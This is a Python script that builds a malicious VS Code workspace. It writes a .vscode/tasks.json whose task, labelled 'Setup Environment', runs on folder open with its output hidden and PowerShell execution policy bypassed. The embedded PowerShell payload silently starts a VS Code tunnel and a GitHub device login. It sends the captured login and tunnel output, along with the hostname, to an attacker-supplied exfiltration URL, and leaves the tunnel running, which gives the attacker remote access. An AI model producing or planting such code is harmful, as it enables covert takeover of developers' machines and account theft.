#!/usr/bin/env python3
import json
from pathlib import Path

def create(output_dir, exfil_url):
    # The PowerShell command as a string, with a placeholder for the listener URL.
    # Note: Double curly braces {{ and }} are used to escape literal braces in the format string.
    ps_command = f'''
$loginFile = "$env:TEMP\\login_output.txt"; Remove-Item $loginFile -Force -ErrorAction SilentlyContinue; Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c', \"code tunnel user login --provider github > `\"$loginFile`\" 2>&1\") -WindowStyle Hidden -PassThru; Start-Sleep -Seconds 10; Get-Process -Name 'code-tunnel' -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep -Seconds 2; $loginRaw = ''; $retries = 5; while ($retries -gt 0 -and -not $loginRaw) {{ try {{ if (Test-Path $loginFile) {{ $loginRaw = [System.IO.File]::ReadAllText($loginFile) }} }} catch {{ Start-Sleep -Milliseconds 500 }}; $retries-- }}; Remove-Item $loginFile -Force -ErrorAction SilentlyContinue; $loginBody = @{{phase='login'; raw=$loginRaw; hostname=$env:COMPUTERNAME}} | ConvertTo-Json; $wc = New-Object System.Net.WebClient; $wc.Headers.Add('Content-Type', 'application/json'); $wc.UploadString('{exfil_url}/tunnel', $loginBody); $tunnelFile = \"$env:TEMP\\tunnel_output.txt\"; Remove-Item $tunnelFile -Force -ErrorAction SilentlyContinue; $tunnelProc = Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c', \"code tunnel > `\"$tunnelFile`\" 2>&1\") -WindowStyle Hidden -PassThru; Start-Sleep -Seconds 20; Get-Process -Name 'code-tunnel' -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep -Seconds 2; $tunnelRaw = ''; $retries2 = 5; while ($retries2 -gt 0 -and -not $tunnelRaw) {{ try {{ if (Test-Path $tunnelFile) {{ $tunnelRaw = [System.IO.File]::ReadAllText($tunnelFile) }} }} catch {{ Start-Sleep -Milliseconds 500 }}; $retries2-- }}; Remove-Item $tunnelFile -Force -ErrorAction SilentlyContinue; $tunnelBody = @{{phase='tunnel'; raw=$tunnelRaw; hostname=$env:COMPUTERNAME}} | ConvertTo-Json; $wc2 = New-Object System.Net.WebClient; $wc2.Headers.Add('Content-Type', 'application/json'); $wc2.UploadString('{exfil_url}/tunnel', $tunnelBody); Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c', \"code tunnel\") -WindowStyle Hidden
'''

    tasks = {
        "version": "2.0.0",
        "tasks": [
            {
                "label": "Setup Environment",
                "type": "process",
                "command": "powershell.exe",
                "args": [
                    "-ExecutionPolicy", "Bypass",
                    "-Command", ps_command.strip()  # Remove leading/trailing whitespace
                ],
                "runOptions": {
                    "runOn": "folderOpen"
                },
                "presentation": {
                    "reveal": "never"
                },
                "problemMatcher": []
            }
        ]
    }

    # Ensure the .vscode directory exists
    (output_dir / ".vscode").mkdir(parents=True, exist_ok=True)
    with open(output_dir / ".vscode" / "tasks.json", 'w') as f:
        json.dump(tasks, f, indent=2)
    print("  [✓] .vscode/tasks.json (working two‑phase tunnel)")
